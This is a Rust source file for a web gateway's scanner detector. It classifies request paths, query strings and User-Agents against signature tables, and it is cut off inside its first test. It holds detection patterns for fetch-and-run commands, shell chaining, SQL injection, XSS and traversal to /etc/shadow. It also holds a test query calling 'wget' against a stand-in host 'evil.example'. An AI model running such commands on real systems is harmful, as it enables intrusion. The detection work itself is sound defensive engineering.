//! Scanner signature tables, Aho-Corasick User-Agent matcher, and query/path classifiers.

use aho_corasick::{AhoCorasick, AhoCorasickBuilder, MatchKind};
use regex::{Regex, RegexBuilder};
use serde::Deserialize;
use std::collections::{HashMap, HashSet};
use std::fs;
use std::path::Path;
use std::sync::OnceLock;

pub const MAX_PATH_LENGTH: usize = 200;
pub const MAX_HOST_LENGTH: usize = 128;
pub const MAX_USER_AGENT_LENGTH: usize = 128;
pub const MAX_LOG_LINE_BYTES: usize = 8192;
pub const MAX_MATCHED_SEGMENTS: usize = 12;
pub const MAX_QUERY_LENGTH: usize = 2048;
pub const QUERY_DECODE_PASSES: usize = 2;
pub const MAX_USER_AGENT_RULES: usize = 200;
pub const MIN_USER_AGENT_TOKEN: usize = 4;

const ASSET_SUFFIXES: &[&str] = &[
    ".css", ".js", ".mjs", ".map", ".json", ".xml", ".txt", ".png", ".jpg", ".jpeg", ".gif",
    ".svg", ".ico", ".webp", ".avif", ".bmp", ".woff", ".woff2", ".ttf", ".eot", ".otf", ".mp4",
    ".webm", ".mp3", ".wav", ".pdf",
];

const AUTHENTICATION_PATHS: &[&str] = &[
    "/api/firstfactor",
    "/api/secondfactor",
    "/api/user/info",
    "/api/state",
    "/api/verify",
    "/api/logout",
    "/api/reset-password",
    "/api/checks",
];

const ALWAYS_UNUSUAL_METHODS: &[&str] = &["TRACE", "TRACK", "CONNECT", "DEBUG"];
const WEBDAV_METHODS: &[&str] = &[
    "PROPFIND",
    "PROPPATCH",
    "REPORT",
    "MKCOL",
    "COPY",
    "MOVE",
    "LOCK",
    "UNLOCK",
];

#[derive(Debug, Deserialize)]
struct SignatureFile {
    #[serde(default)]
    version: Option<String>,
    #[serde(default)]
    decisive: Vec<String>,
    #[serde(default)]
    segments: HashMap<String, String>,
    #[serde(default)]
    paths: HashMap<String, String>,
    #[serde(default)]
    traps: Vec<String>,
    #[serde(default)]
    queries: Option<OrderedRules>,
    #[serde(default)]
    user_agents: Option<OrderedRules>,
}

#[derive(Debug)]
struct OrderedRules(Vec<(String, serde_json::Value)>);

impl<'de> Deserialize<'de> for OrderedRules {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        struct RulesVisitor;
        impl<'de> serde::de::Visitor<'de> for RulesVisitor {
            type Value = OrderedRules;

            fn expecting(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
                formatter.write_str("a mapping of signature rules")
            }

            fn visit_map<A: serde::de::MapAccess<'de>>(
                self,
                mut map: A,
            ) -> Result<Self::Value, A::Error> {
                let mut rules = hashlink::LinkedHashMap::new();
                while let Some((name, value)) = map.next_entry()? {
                    // Match Python dict ordering even for a repeated key.
                    if let Some(previous) = rules.get_mut(&name) {
                        *previous = value;
                    } else {
                        rules.insert(name, value);
                    }
                }
                Ok(OrderedRules(rules.into_iter().collect()))
            }
        }
        deserializer.deserialize_map(RulesVisitor)
    }
}

#[derive(Debug, Clone)]
enum CompiledQueryRule {
    FetchAndRun,
    Regex(Regex),
}

#[derive(Debug, Clone)]
struct QueryRuleEntry {
    name: String,
    matcher: CompiledQueryRule,
}

#[derive(Debug, Clone)]
struct UserAgentRule {
    written: String,
    category: String,
}

/// Compiled signature engine for O(1) path/segment lookup and single-pass
/// Aho-Corasick User-Agent matching.
#[derive(Debug)]
pub struct SignatureEngine {
    pub version: String,
    decisive: HashSet<String>,
    paths: HashMap<String, String>,
    segments_exact: HashMap<String, String>,
    segments_lower: HashMap<String, String>,
    prefixes: Vec<(String, String)>,
    query_rules: Vec<QueryRuleEntry>,
    ua_automaton: Option<AhoCorasick>,
    ua_rules: Vec<UserAgentRule>,
    // The shipped list as read, before the operator's rules go on top, so the
    // two can be merged again whenever the overrides change.
    shipped_paths: HashMap<String, String>,
    shipped_segments: HashMap<String, String>,
    shipped_queries: Vec<QueryRuleEntry>,
    shipped_agents: Vec<(String, String)>,
    merged_segments: HashMap<String, String>,
    pub source: String,
}

impl SignatureEngine {
    /// The same shipped list with an operator's additions and suppressions on
    /// top (Python `publish_signatures`).
    pub fn with_overrides(&self, added: &[(String, String)], disabled: &[String]) -> Self {
        let mut segments = self.shipped_segments.clone();
        let mut paths = self.shipped_paths.clone();
        for token in disabled {
            paths.remove(token);
            segments.remove(token);
        }
        for (token, category) in added {
            if token.starts_with('/') {
                paths.insert(token.clone(), category.clone());
            } else {
                segments.insert(token.clone(), category.clone());
            }
        }
        let mut engine = Self::compile(
            self.version.clone(),
            self.decisive.clone(),
            paths,
            segments,
            self.shipped_queries.clone(),
            self.shipped_agents.clone(),
        );
        engine.shipped_paths = self.shipped_paths.clone();
        engine.shipped_segments = self.shipped_segments.clone();
        engine.source = self.source.clone();
        engine
    }

    /// Segment token -> category, as in force (shipped plus overrides).
    pub fn segment_map(&self) -> &HashMap<String, String> {
        &self.merged_segments
    }

    /// Whole path -> category, as in force.
    pub fn path_map(&self) -> &HashMap<String, String> {
        &self.paths
    }

    pub fn query_rule_names(&self) -> Vec<String> {
        self.query_rules.iter().map(|r| r.name.clone()).collect()
    }

    /// (token as written, category) for each User-Agent rule in force.
    pub fn user_agents(&self) -> Vec<(String, String)> {
        self.ua_rules
            .iter()
            .map(|r| (r.written.clone(), r.category.clone()))
            .collect()
    }

    pub fn decisive_categories(&self) -> &HashSet<String> {
        &self.decisive
    }

    /// Every category a path rule can produce.
    pub fn path_categories(&self) -> HashSet<String> {
        self.merged_segments
            .values()
            .chain(self.paths.values())
            .cloned()
            .collect()
    }

    /// Build an engine with the built-in fallback signatures matching Python `guardd.constants`.
    pub fn builtin() -> Self {
        let mut segments = HashMap::new();
        for &(k, v) in BUILTIN_SEGMENTS {
            segments.insert(k.to_string(), v.to_string());
        }
        let mut paths = HashMap::new();
        for &(k, v) in BUILTIN_PATHS {
            paths.insert(k.to_string(), v.to_string());
        }
        let decisive: HashSet<String> = ["secrets", "vcs", "backup", "scanner-tool"]
            .into_iter()
            .map(String::from)
            .collect();
        let query_rules = default_query_rules();
        let ua_pairs: Vec<(String, String)> = BUILTIN_USER_AGENTS
            .iter()
            .map(|&(k, v)| (k.to_string(), v.to_string()))
            .collect();
        Self::compile(
            "built-in".to_string(),
            decisive,
            paths,
            segments,
            query_rules,
            ua_pairs,
        )
    }

    /// Load signatures from a `scanner-signatures.json` file.
    pub fn from_file(path: impl AsRef<Path>) -> Result<Self, String> {
        let content = fs::read_to_string(path.as_ref())
            .map_err(|e| format!("cannot read {}: {e}", path.as_ref().display()))?;
        let mut engine = Self::from_json(&content)?;
        engine.source = path.as_ref().display().to_string();
        Ok(engine)
    }

    /// Parse and compile signatures from JSON text.
    pub fn from_json(json_text: &str) -> Result<Self, String> {
        let parsed: SignatureFile =
            serde_json::from_str(json_text).map_err(|e| format!("invalid signature JSON: {e}"))?;
        if parsed.segments.is_empty() || parsed.paths.is_empty() {
            return Err("signature file carries no segments or paths".to_string());
        }
        let mut paths = parsed.paths;
        for trap in parsed.traps {
            paths.insert(trap, "trap".to_string());
        }
        let decisive: HashSet<String> = parsed.decisive.into_iter().collect();

        let query_rules = match parsed.queries {
            Some(OrderedRules(map)) if !map.is_empty() => {
                let mut compiled = Vec::with_capacity(map.len());
                let mut ok = true;
                for (name, val) in map {
                    let Some(pattern) = val.as_str() else {
                        ok = false;
                        break;
                    };
                    if name == "fetch-and-run" && pattern == DEFAULT_FETCH_AND_RUN_PATTERN {
                        compiled.push(QueryRuleEntry {
                            name,
                            matcher: CompiledQueryRule::FetchAndRun,
                        });
                        continue;
                    }
                    match RegexBuilder::new(pattern).case_insensitive(true).build() {
                        Ok(re) => compiled.push(QueryRuleEntry {
                            name,
                            matcher: CompiledQueryRule::Regex(re),
                        }),
                        Err(_) => {
                            ok = false;
                            break;
                        }
                    }
                }
                if ok && !compiled.is_empty() {
                    compiled
                } else {
                    default_query_rules()
                }
            }
            _ => default_query_rules(),
        };

        let ua_pairs: Vec<(String, String)> = match parsed.user_agents {
            Some(OrderedRules(map)) if !map.is_empty() => map
                .into_iter()
                .filter_map(|(k, v)| v.as_str().map(|s| (k, s.to_string())))
                .collect(),
            _ => BUILTIN_USER_AGENTS
                .iter()
                .map(|&(k, v)| (k.to_string(), v.to_string()))
                .collect(),
        };

        let version = parsed
            .version
            .filter(|v| !v.is_empty())
            .unwrap_or_else(|| "unversioned".to_string());
        Ok(Self::compile(
            version,
            decisive,
            paths,
            parsed.segments,
            query_rules,
            ua_pairs,
        ))
    }

    fn compile(
        version: String,
        decisive: HashSet<String>,
        paths: HashMap<String, String>,
        segments: HashMap<String, String>,
        query_rules: Vec<QueryRuleEntry>,
        ua_pairs: Vec<(String, String)>,
    ) -> Self {
        let shipped_paths = paths.clone();
        let shipped_segments = segments.clone();
        let shipped_queries = query_rules.clone();
        let shipped_agents = ua_pairs.clone();
        let merged_segments = segments.clone();
        let mut segments_exact = HashMap::with_capacity(segments.len());
        let mut segments_lower = HashMap::with_capacity(segments.len());
        let mut prefixes = Vec::new();
        for (token, category) in segments {
            if token.ends_with('*') && token.len() > 1 {
                prefixes.push((
                    token[..token.len() - 1].to_ascii_lowercase(),
                    category.clone(),
                ));
            }
            segments_lower
                .entry(token.to_ascii_lowercase())
                .or_insert_with(|| category.clone());
            segments_exact.insert(token, category);
        }
        prefixes.sort_by(|a, b| a.0.cmp(&b.0));

        // Compile User-Agent Aho-Corasick automaton preserving rule order.
        let mut ua_tokens: Vec<String> = Vec::new();
        let mut ua_rules: Vec<UserAgentRule> = Vec::new();
        let mut seen_tokens: HashMap<String, usize> = HashMap::new();
        for (written, category) in ua_pairs.into_iter().take(MAX_USER_AGENT_RULES) {
            let token = user_agent_token(&written);
            if token.trim_matches('_').len() >= MIN_USER_AGENT_TOKEN && !category.is_empty() {
                if let Some(&idx) = seen_tokens.get(&token) {
                    ua_rules[idx] = UserAgentRule { written, category };
                } else {
                    seen_tokens.insert(token.clone(), ua_rules.len());
                    ua_tokens.push(token);
                    ua_rules.push(UserAgentRule { written, category });
                }
            }
        }
        let ua_automaton = if ua_tokens.is_empty() {
            None
        } else {
            AhoCorasickBuilder::new()
                .ascii_case_insensitive(true)
                .match_kind(MatchKind::Standard)
                .build(&ua_tokens)
                .ok()
        };

        Self {
            version,
            decisive,
            paths,
            segments_exact,
            segments_lower,
            prefixes,
            query_rules,
            ua_automaton,
            ua_rules,
            shipped_paths,
            shipped_segments,
            shipped_queries,
            shipped_agents,
            merged_segments,
            source: String::new(),
        }
    }

    #[inline]
    pub fn category_is_decisive(&self, category: &str) -> bool {
        !category.is_empty() && self.decisive.contains(category)
    }

    /// Return the scanner category for a normalised path, or `""`.
    pub fn classify_path(&self, path: &str) -> &str {
        if path.is_empty() || path == "/" {
            return "";
        }
        if let Some(exact) = self.paths.get(path) {
            return exact.as_str();
        }
        let mut probable: &str = "";
        for segment in path.splitn(MAX_MATCHED_SEGMENTS + 2, '/').skip(1) {
            if segment.is_empty() {
                continue;
            }
            let cat = self.lookup_segment(segment);
            if cat.is_empty() {
                continue;
            }
            if self.category_is_decisive(cat) {
                return cat;
            }
            if probable.is_empty() {
                probable = cat;
            }
        }
        if probable.is_empty() || is_asset(path) || is_authentication_endpoint(path) {
            ""
        } else {
            probable
        }
    }

    fn lookup_segment(&self, segment: &str) -> &str {
        if let Some(cat) = self.segments_exact.get(segment) {
            return cat.as_str();
        }
        let lowered = segment.to_ascii_lowercase();
        if let Some(cat) = self.segments_lower.get(&lowered) {
            return cat.as_str();
        }
        for (prefix, cat) in &self.prefixes {
            if lowered.starts_with(prefix.as_str()) {
                return cat.as_str();
            }
        }
        ""
    }

    /// Single-pass Aho-Corasick User-Agent classification.
    /// Returns `(written_token, category)` matching Python dict iteration order.
    pub fn classify_user_agent(&self, value: &str) -> (&str, &str) {
        if value.is_empty() || value == "-" {
            return ("", "");
        }
        let Some(ref ac) = self.ua_automaton else {
            return ("", "");
        };
        let mut best_idx: Option<usize> = None;
        for m in ac.find_overlapping_iter(value) {
            let idx = m.pattern().as_usize();
            if best_idx.is_none_or(|b| idx < b) {
                best_idx = Some(idx);
                if idx == 0 {
                    break;
                }
            }
        }
        if let Some(idx) = best_idx {
            let rule = &self.ua_rules[idx];
            (rule.written.as_str(), rule.category.as_str())
        } else {
            ("", "")
        }
    }

    /// Name the injection shape in a request target's query, or `""`.
    pub fn classify_query(&self, uri: &str) -> &str {
        let Some(qpos) = memchr::memchr(b'?', uri.as_bytes()) else {
            return "";
        };
        let raw_query = &uri[qpos + 1..];
        if raw_query.is_empty() {
            return "";
        }
        let mut query = truncate_chars(raw_query, MAX_QUERY_LENGTH).to_string();
        for _ in 0..QUERY_DECODE_PASSES {
            query = unquote_plus(&query);
        }
        for part in query.splitn(65, '&') {
            let val = match part.split_once('=') {
                Some((_, v)) => v.trim(),
                None => part.trim(),
            };
            if val.is_empty() {
                continue;
            }
            for rule in &self.query_rules {
                let matched = match &rule.matcher {
                    CompiledQueryRule::FetchAndRun => match_fetch_and_run(val),
                    CompiledQueryRule::Regex(re) => re.is_match(val),
                };
                if matched {
                    return rule.name.as_str();
                }
            }
        }
        ""
    }

    /// Observation-only flags matching `guardd.parser.observation_flags`.
    pub fn observation_flags(&self, uri: &str) -> Vec<&'static str> {
        let text = truncate_chars(uri, 4096);
        let mut flags: Vec<&'static str> = Vec::new();
        let (raw_path, query) = split_uri_path_and_query(text);
        if !query.is_empty() {
            let q = truncate_chars(query, MAX_QUERY_LENGTH);
            let sql_re = obs_sql_regex();
            let xss_re = obs_xss_regex();
            let mut has_sql = false;
            let mut has_xss = false;
            for part in q.splitn(65, '&') {
                let mut val = match part.split_once('=') {
                    Some((_, v)) => v.to_string(),
                    None => part.to_string(),
                };
                for _ in 0..2 {
                    val = unquote_plus(&val);
                }
                if !has_sql && sql_re.is_match(&val) {
                    has_sql = true;
                    flags.push("observe:sql-injection");
                }
                if !has_xss && xss_re.is_match(&val) {
                    has_xss = true;
                    flags.push("observe:script-injection");
                }
                if has_sql && has_xss {
                    break;
                }
            }
        }

        let path_for_probe = extract_url_path_slice(raw_path);
        if service_api_probe_regex().is_match(truncate_chars(path_for_probe, 200)) {
            flags.push("observe:service-api-probe");
        }
        if contains_ascii_case_insensitive(raw_path.as_bytes(), b"%25") {
            let first = normalize_path(raw_path);
            let decoded_once = unquote(raw_path);
            let second = normalize_path(&decoded_once);
            if second != first && self.category_is_decisive(self.classify_path(&second)) {
                flags.push("observe:encoded-sensitive-path");
            }
        }
        flags
    }
}

/// Normalize a User-Agent token the way HAProxy reduces headers.
pub fn user_agent_token(text: &str) -> String {
    text.chars()
        .map(|c| {
            let lc = c.to_ascii_lowercase();
            if lc.is_ascii_lowercase()
                || lc.is_ascii_digit()
                || matches!(lc, '.' | '/' | ';' | ':' | '_' | '-')
            {
                lc
            } else {
                '_'
            }
        })
        .collect()
}

/// Reduce a request target to a canonical path without query/fragment.
pub fn normalize_path(value: &str) -> String {
    if value.is_empty() {
        return "/".to_string();
    }
    let mut text = value.trim();
    if text.is_empty() {
        return "/".to_string();
    }
    if text.starts_with("http://") || text.starts_with("https://") {
        let p = extract_url_path_slice(text);
        text = if p.is_empty() { "/" } else { p };
    }
    if let Some(pos) = text.find('?') {
        text = &text[..pos];
    }
    if let Some(pos) = text.find('#') {
        text = &text[..pos];
    }
    let decoded = unquote(text);
    // Strip control chars and resolve segments in one pass without regexes.
    let mut cleaned = String::with_capacity(decoded.len().min(MAX_PATH_LENGTH + 16));
    for c in decoded.chars() {
        let code = c as u32;
        if code <= 0x1F || code == 0x7F {
            continue;
        }
        cleaned.push(c);
    }
    let mut segments: Vec<&str> = Vec::with_capacity(8);
    for seg in cleaned.split('/') {
        if seg.is_empty() || seg == "." {
            continue;
        }
        if seg == ".." {
            segments.pop();
            continue;
        }
        segments.push(seg);
    }
    let mut out = String::with_capacity(cleaned.len().min(MAX_PATH_LENGTH) + 1);
    out.push('/');
    for (idx, seg) in segments.iter().enumerate() {
        if idx > 0 {
            out.push('/');
        }
        out.push_str(seg);
    }
    if out.chars().count() > MAX_PATH_LENGTH {
        out.chars().take(MAX_PATH_LENGTH).collect()
    } else {
        out
    }
}

/// True if path ends with an ordinary static asset suffix.
#[inline]
pub fn is_asset(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    ASSET_SUFFIXES.iter().any(|suf| lower.ends_with(suf))
}

/// True if path belongs to the gateway's own authentication surface.
pub fn is_authentication_endpoint(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    AUTHENTICATION_PATHS.iter().any(|&prefix| {
        lower == prefix
            || (lower.starts_with(prefix) && lower.as_bytes().get(prefix.len()) == Some(&b'/'))
    })
}

/// Recognise repeated traversal to sensitive OS targets before canonicalisation.
pub fn classify_raw_path(uri: &str) -> &'static str {
    if uri.is_empty() {
        return "";
    }
    let (raw_path, _) = split_uri_path_and_query(uri);
    let mut text = truncate_chars(raw_path, 2048).to_string();
    let bytes = text.as_bytes();
    if !contains_bytes(bytes, b"..")
        && !contains_ascii_case_insensitive(bytes, b"%2e")
        && !contains_ascii_case_insensitive(bytes, b"%25")
    {
        return "";
    }
    if text.starts_with("http://") || text.starts_with("https://") {
        text = extract_url_path_slice(&text).to_string();
    }
    let target_re = raw_traversal_target_regex();
    for _ in 0..2 {
        text = unquote(&text).replace('\\', "/").to_ascii_lowercase();
        let dotdot_count = text.split('/').filter(|&s| s == "..").count();
        if dotdot_count >= 2 && target_re.is_match(&text) {
            return "path-traversal";
        }
    }
    ""
}

/// True when a client claims a modern desktop/mobile browser UA over HTTP/1.0.
pub fn is_proto_ua_mismatch(protocol: &str, user_agent: &str) -> bool {
    protocol == "HTTP/1.0"
        && !user_agent.is_empty()
        && modern_browser_ua_regex().is_match(user_agent)
}

/// True when a request uses TRACE/TRACK/CONNECT/DEBUG or a WebDAV method outside a webdav profile.
pub fn is_unusual_method_probe(method: &str, profile: &str) -> bool {
    if method.is_empty() {
        return false;
    }
    if ALWAYS_UNUSUAL_METHODS.contains(&method) {
        return true;
    }
    if WEBDAV_METHODS.contains(&method) {
        return profile != "webdav";
    }
    false
}

const DEFAULT_FETCH_AND_RUN_PATTERN: &str = r"(?:^|[;&|]\s*)(?:(?:wget|curl)\s+(?=[^;&|\r\n]{0,384}(?:https?|ftp)://)|tftp\s+(?:-g\b|-r\b|[0-9])|chmod\s+\+?x\b|busybox\s+(?:wget|curl|tftp)\b)";

/// Linear-time implementation of Python's `fetch-and-run` query rule without lookahead backtracking:
/// `(?:^|[;&|]\s*)(?:(?:wget|curl)\s+(?=[^;&|\r\n]{0,384}(?:https?|ftp)://)|tftp\s+(?:-g\b|-r\b|[0-9])|chmod\s+\+?x\b|busybox\s+(?:wget|curl|tftp)\b)`
fn match_fetch_and_run(value: &str) -> bool {
    if fetch_and_run_non_url_regex().is_match(value) {
        return true;
    }
    let re = fetch_and_run_wget_curl_regex();
    for m in re.find_iter(value) {
        let rest = &value[m.end()..];
        let delim = rest
            .bytes()
            .position(|b| matches!(b, b';' | b'&' | b'|' | b'\r' | b'\n'))
            .unwrap_or(rest.len());
        let segment = &rest[..delim];
        let max_prefix_bytes = segment
            .char_indices()
            .nth(384)
            .map(|(idx, _)| idx)
            .unwrap_or(segment.len());
        let search_end = (max_prefix_bytes + 8).min(segment.len());
        let window = &segment.as_bytes()[..search_end];
        for scheme in [
            b"http://".as_slice(),
            b"https://".as_slice(),
            b"ftp://".as_slice(),
        ] {
            if let Some(pos) = find_ascii_case_insensitive(window, scheme) {
                if pos <= max_prefix_bytes {
                    return true;
                }
            }
        }
    }
    false
}

fn find_ascii_case_insensitive(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() {
        return Some(0);
    }
    if haystack.len() < needle.len() {
        return None;
    }
    haystack
        .windows(needle.len())
        .position(|w| w.eq_ignore_ascii_case(needle))
}

/// Percent-decode a UTF-8 string (lossy on invalid sequences, matching `urllib.parse.unquote`).
pub fn unquote(input: &str) -> String {
    if !input.as_bytes().contains(&b'%') {
        return input.to_string();
    }
    let bytes = input.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let (Some(h), Some(l)) = (hex_val(bytes[i + 1]), hex_val(bytes[i + 2])) {
                out.push((h << 4) | l);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Strict UTF-8 percent decoding (matching `urllib.parse.unquote(s, errors="strict")`).
pub fn unquote_strict(input: &str) -> Option<String> {
    if !input.as_bytes().contains(&b'%') {
        return Some(input.to_string());
    }
    let bytes = input.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let (Some(h), Some(l)) = (hex_val(bytes[i + 1]), hex_val(bytes[i + 2])) {
                out.push((h << 4) | l);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8(out).ok()
}

/// Percent-decode with `+` mapped to space (matching `urllib.parse.unquote_plus`).
pub fn unquote_plus(input: &str) -> String {
    if !input.as_bytes().contains(&b'%') && !input.as_bytes().contains(&b'+') {
        return input.to_string();
    }
    let bytes = input.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'+' {
            out.push(b' ');
            i += 1;
        } else if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let (Some(h), Some(l)) = (hex_val(bytes[i + 1]), hex_val(bytes[i + 2])) {
                out.push((h << 4) | l);
                i += 3;
                continue;
            }
            out.push(bytes[i]);
            i += 1;
        } else {
            out.push(bytes[i]);
            i += 1;
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

#[inline]
fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

pub(crate) fn split_uri_path_and_query(uri: &str) -> (&str, &str) {
    let before_hash = match memchr::memchr(b'#', uri.as_bytes()) {
        Some(h) => &uri[..h],
        None => uri,
    };
    match memchr::memchr(b'?', before_hash.as_bytes()) {
        Some(q) => (&before_hash[..q], &before_hash[q + 1..]),
        None => (before_hash, ""),
    }
}

/// Extract the path slice of an absolute `http://` or `https://` URL, or return input as-is.
pub(crate) fn extract_url_path_slice(raw: &str) -> &str {
    let rest = if let Some(r) = raw.strip_prefix("https://") {
        r
    } else if let Some(r) = raw.strip_prefix("http://") {
        r
    } else {
        return raw;
    };
    match memchr::memchr(b'/', rest.as_bytes()) {
        Some(slash) => &rest[slash..],
        None => "",
    }
}

#[inline]
pub(crate) fn truncate_chars(s: &str, max_chars: usize) -> &str {
    if s.len() <= max_chars {
        return s;
    }
    match s.char_indices().nth(max_chars) {
        Some((idx, _)) => &s[..idx],
        None => s,
    }
}

#[inline]
fn contains_bytes(haystack: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() || needle.len() > haystack.len() {
        return false;
    }
    haystack.windows(needle.len()).any(|w| w == needle)
}

#[inline]
fn contains_ascii_case_insensitive(haystack: &[u8], needle_lower: &[u8]) -> bool {
    if needle_lower.is_empty() || needle_lower.len() > haystack.len() {
        return false;
    }
    haystack
        .windows(needle_lower.len())
        .any(|w| w.eq_ignore_ascii_case(needle_lower))
}

fn default_query_rules() -> Vec<QueryRuleEntry> {
    vec![
        QueryRuleEntry {
            name: "fetch-and-run".to_string(),
            matcher: CompiledQueryRule::FetchAndRun,
        },
        QueryRuleEntry {
            name: "traversal".to_string(),
            matcher: CompiledQueryRule::Regex(
                RegexBuilder::new(r"(\.\./\.\./|%2e%2e[/%])")
                    .case_insensitive(true)
                    .build()
                    .expect("valid regex"),
            ),
        },
        QueryRuleEntry {
            name: "shell-chaining".to_string(),
            matcher: CompiledQueryRule::Regex(
                RegexBuilder::new(r"(;\s*(sh|bash|cat|ls|id|uname|rm)\b|\|\s*(sh|bash)\b)")
                    .case_insensitive(true)
                    .build()
                    .expect("valid regex"),
            ),
        },
        QueryRuleEntry {
            name: "substitution".to_string(),
            matcher: CompiledQueryRule::Regex(
                RegexBuilder::new(r"(\$\(|`[a-z/]{2,})")
                    .case_insensitive(true)
                    .build()
                    .expect("valid regex"),
            ),
        },
        QueryRuleEntry {
            name: "absolute-binary".to_string(),
            matcher: CompiledQueryRule::Regex(
                RegexBuilder::new(r"/(bin|usr/bin|sbin)/(sh|bash|nc|perl|python)")
                    .case_insensitive(true)
                    .build()
                    .expect("valid regex"),
            ),
        },
    ]
}

fn fetch_and_run_non_url_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        RegexBuilder::new(
            r"(?:^|[;&|]\s*)(?:tftp\s+(?:-g\b|-r\b|[0-9])|chmod\s+\+?x\b|busybox\s+(?:wget|curl|tftp)\b)",
        )
        .case_insensitive(true)
        .build()
        .expect("valid regex")
    })
}

fn fetch_and_run_wget_curl_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        RegexBuilder::new(r"(?:^|[;&|]\s*)(?:wget|curl)\s+")
            .case_insensitive(true)
            .build()
            .expect("valid regex")
    })
}

fn obs_sql_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        RegexBuilder::new(
            r"\bunion\s+(?:all\s+)?select\b|['\x22]\s*(?:or|and)\s+['\x22\d]+\s*=|\b(?:sleep|benchmark)\s*\(",
        )
        .case_insensitive(true)
        .build()
        .expect("valid regex")
    })
}

fn obs_xss_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        RegexBuilder::new(r"<\s*script\b|<[^>\r\n]{0,160}\bon(?:error|load)\s*=|javascript\s*:")
            .case_insensitive(true)
            .build()
            .expect("valid regex")
    })
}

fn service_api_probe_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        RegexBuilder::new(
            r"^/(?:v[0-9]{1,2}(?:\.[0-9]{1,2})?/(?:containers/(?:json|[^/]{1,80}/json)|images/json|info|version)|v2/_catalog|latest/meta-data(?:/[^?]*)?|computemetadata/v1(?:/[^?]*)?|actuator/(?:env|heapdump|configprops|mappings))(?:/|$)",
        )
        .case_insensitive(true)
        .build()
        .expect("valid regex")
    })
}

fn raw_traversal_target_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"/(?:etc/(?:passwd|shadow)|proc/(?:self|1)/environ|windows/(?:win|system)\.ini)(?:/|$)",
        )
        .expect("valid regex")
    })
}

fn modern_browser_ua_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"(?:Chrome|Firefox|Edg)/(?:[89]\d|[1-9]\d{2,})\.|Version/(?:1[4-9]|[2-9]\d)\.\d+[^/\r\n]{0,60}Safari/",
        )
        .expect("valid regex")
    })
}

const BUILTIN_SEGMENTS: &[(&str, &str)] = &[
    (".env", "secrets"),
    (".env*", "secrets"),
    (".git", "vcs"),
    (".svn", "vcs"),
    (".hg", "vcs"),
    (".aws", "secrets"),
    (".ssh", "secrets"),
    (".DS_Store", "secrets"),
    ("phpmyadmin", "database-admin"),
    ("pma", "database-admin"),
    ("myadmin", "database-admin"),
    ("adminer.php", "database-admin"),
    ("wp-login.php", "wordpress"),
    ("wp-admin", "wordpress"),
    ("wp-content", "wordpress"),
    ("wp-includes", "wordpress"),
    ("xmlrpc.php", "wordpress"),
    ("server-status", "server-info"),
    ("server-info", "server-info"),
    ("phpinfo.php", "server-info"),
    ("actuator", "app-framework"),
    ("solr", "app-framework"),
    ("jenkins", "app-framework"),
    ("struts", "app-framework"),
    ("cgi-bin", "legacy-cgi"),
    ("vendor", "dependency"),
    ("backup.zip", "backup"),
    ("backup.sql", "backup"),
    ("backup.tar.gz", "backup"),
    ("database.sql", "backup"),
    ("dump.sql", "backup"),
    ("config.php", "config"),
    ("configuration.php", "config"),
    ("web.config", "config"),
    ("docker-compose.yml", "config"),
    ("id_rsa", "secrets"),
];

const BUILTIN_PATHS: &[(&str, &str)] = &[
    ("/.env", "secrets"),
    ("/.git/config", "vcs"),
    ("/.aws/credentials", "secrets"),
    ("/.ssh/id_rsa", "secrets"),
];

const BUILTIN_USER_AGENTS: &[(&str, &str)] = &[
    ("sqlmap", "scanner-tool"),
    ("nikto", "scanner-tool"),
    ("nuclei", "scanner-tool"),
    ("wpscan", "scanner-tool"),
    ("gobuster", "scanner-tool"),
    ("dirbuster", "scanner-tool"),
    ("feroxbuster", "scanner-tool"),
    ("dirsearch", "scanner-tool"),
    ("fuzz faster u fool", "scanner-tool"),
    ("wfuzz", "scanner-tool"),
    ("acunetix", "scanner-tool"),
    ("netsparker", "scanner-tool"),
    ("openvas", "scanner-tool"),
    ("w3af", "scanner-tool"),
    ("nmap scripting engine", "scanner-tool"),
    ("jorgee", "scanner-tool"),
    ("zgrab", "survey"),
    ("masscan", "survey"),
    ("censysinspect", "survey"),
    ("expanse, a palo alto", "survey"),
    ("internet-measurement", "survey"),
    ("leakix", "survey"),
    ("l9explore", "survey"),
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fetch_and_run_matches_scheme_at_384_char_boundary() {
        let prefix = "a".repeat(384);
        let q = format!("/?cmd=wget+{prefix}https://evil.example/a.sh");
        assert_eq!(
            SignatureEngine::builtin().classify_query(&q),
            "fetch-and-run"
        );

